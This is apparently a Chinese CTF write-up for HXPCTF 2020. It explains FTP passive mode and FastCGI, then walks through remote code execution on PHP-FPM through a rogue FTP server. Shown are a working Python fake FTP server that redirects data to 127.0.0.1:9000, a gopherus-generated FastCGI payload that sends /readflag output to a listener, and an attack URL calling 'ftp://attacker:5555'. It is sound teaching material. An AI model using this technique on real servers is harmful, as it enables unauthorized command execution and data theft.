---
title: Web安全--PHP-FPM被动RCE
categories:
- CTF
- Web
tags:
- Web安全
- PHP-FPM
- FastCGI
---

## 前置知识

在介绍这个漏洞之前，需要先了解几个概念。

---

### 一. FTP 的主动模式与被动模式

**主动模式（PORT）**

```
控制通道：客户端随机高位端口 X → 服务器 21 端口
客户端通过 PORT 命令将自己的 IP:X+1 发给服务器
数据通道：服务器 20 端口 → 主动连接客户端 X+1 端口
```

**被动模式（PASV）**

```
控制通道：客户端随机高位端口 → 服务器 21 端口
客户端发送 PASV 命令
服务器随机打开高位端口 Y，将 IP:Y 告诉客户端
数据通道：客户端主动连接服务器 Y 端口
```

由于防火墙的存在，服务器主动连接客户端容易被拦截，因此现在基本使用被动模式。

---

### 二. FastCGI 基本概念与工作原理

**CGI（Common Gateway Interface，通用网关接口）**

Nginx 只能处理 HTML/CSS/图片等静态文件。CGI 可以调用 PHP、Python 等程序处理动态请求：

```
client → Nginx → CGI → PHP 程序 → Nginx → client
```

但原生 CGI 每次请求都要创建进程、处理完立即销毁，并发高时效率极低。

**FastCGI**

FastCGI 采用**进程池 + 常驻内存**架构，解决 CGI 的性能瓶颈。服务器启动时预先创建一批工作进程，常驻内存不退出，等待请求。

---

### 三. PHP-FPM 是什么

PHP-FPM（PHP FastCGI Process Manager）是管理 FastCGI PHP 进程的工具，负责创建、管理、调度、维护常驻 PHP 工作进程。

**工作原理**：

{% asset_img image.png %}

1. PHP-FPM 启动，创建 Worker 进程池，监听 9000 端口或 Unix Socket
2. 客户端访问 `index.php`，请求到达 Nginx
3. Nginx 通过 FastCGI 协议将请求发给 PHP-FPM
4. PHP-FPM 调度空闲 Worker 执行 PHP 代码
5. 结果返回 Nginx，再由 Nginx 发给客户端
6. Worker 不销毁，回到进程池等待复用

---

### 四. PHP-FPM 被动模式 RCE 漏洞

#### 题目：HXPCTF 2020

**源码**：

```php
<?php
$file = $_GET['file'] ?? '/tmp/file';
$data = $_GET['data'] ?? ':)';
file_put_contents($file, $data);
echo file_get_contents($file);
?>
```

PHP 支持的协议列表（[文档](https://www.php.net/manual/zh/wrappers.php#wrappers)）：

```
file://   — 访问本地文件系统
http://   — 访问 HTTP(s) 网址
ftp://    — 访问 FTP(s) URLs
php://    — 访问输入/输出流
data://   — 数据 (RFC 2397)
...
```

**Dockerfile**：

```dockerfile
FROM debian:buster
RUN apt-get install -y nginx php-fpm
COPY flag.txt docker-stuff/readflag /
RUN chown 0:1337 /flag.txt /readflag && \
    chmod 040 /flag.txt && chmod 2555 /readflag
COPY index.php /var/www/html/
```

容器权限校验严格，获取 flag 只能通过 `/readflag` 这个 SUID 程序，且可直接利用的协议只有 `ftp://`。

#### 攻击思路

1. 创建虚假 FTP 服务器，诱导目标连接本地 `127.0.0.1:9000`（FastCGI 端口）
2. 发送 FastCGI 报文执行命令，将数据带出
3. 监听本地获取 flag

#### 第一步：虚假 FTP 服务器

```python
import socket

LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 5555
BUFFER_SIZE = 1024

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((LISTEN_HOST, LISTEN_PORT))
    server_socket.listen(3)
    print(f"FTP server started: {LISTEN_HOST}:{LISTEN_PORT}")

    client_conn, client_addr = server_socket.accept()
    print(f"Client connected: {client_addr}")

    try:
        client_conn.sendall(b"220 \r\n")          # Service ready
        print("[+]", client_conn.recv(BUFFER_SIZE).decode().strip())

        client_conn.sendall(b"331 \r\n")          # Username OK
        print("[+]", client_conn.recv(BUFFER_SIZE).decode().strip())

        client_conn.sendall(b"230 \r\n")          # Login success
        print("[+]", client_conn.recv(BUFFER_SIZE).decode().strip())

        client_conn.sendall(b"200 \r\n")          # Command OK
        print("[+]", client_conn.recv(BUFFER_SIZE).decode().strip())

        client_conn.sendall(b"550 \r\n")          # File unavailable
        print("[+]", client_conn.recv(BUFFER_SIZE).decode().strip())

        client_conn.sendall(b"200 \r\n")          # Ignore EPSV
        print("[+]", client_conn.recv(BUFFER_SIZE).decode().strip())

        # 227 Entering Passive Mode → 指向 127.0.0.1:9000 (35*256+40=9000)
        client_conn.sendall(b"227 127,0,0,1,35,40\r\n")
        print("[+]", client_conn.recv(BUFFER_SIZE).decode().strip())

        client_conn.sendall(b"150 \r\n")          # File status OK
        print("[+]", client_conn.recv(BUFFER_SIZE).decode().strip())

    finally:
        client_conn.close()
        server_socket.close()

if __name__ == "__main__":
    main()
```

核心在 `227 127,0,0,1,35,40`，端口计算规则：`35 × 256 + 40 = 9000`，将数据传输端口指向本机 FastCGI 端口。

#### 第二步：生成 FastCGI 报文

使用 gopherus 生成 payload，执行 `/readflag` 并将结果带出到监听端口：

{% asset_img image_1.png %}

#### 第三步：最终利用

本地监听 4444：

{% asset_img image_2.png %}

运行虚假 FTP 脚本：

{% asset_img image_3.png %}

发送 payload：

```
http://target:8009/?file=ftp://attacker:5555/a&data=<fastcgi_payload>
```

{% asset_img image_4.png %}

`file` 传入 FTP 协议指向虚假 FTP 服务器，`data` 传入生成的 FastCGI 报文，漏洞利用完成。
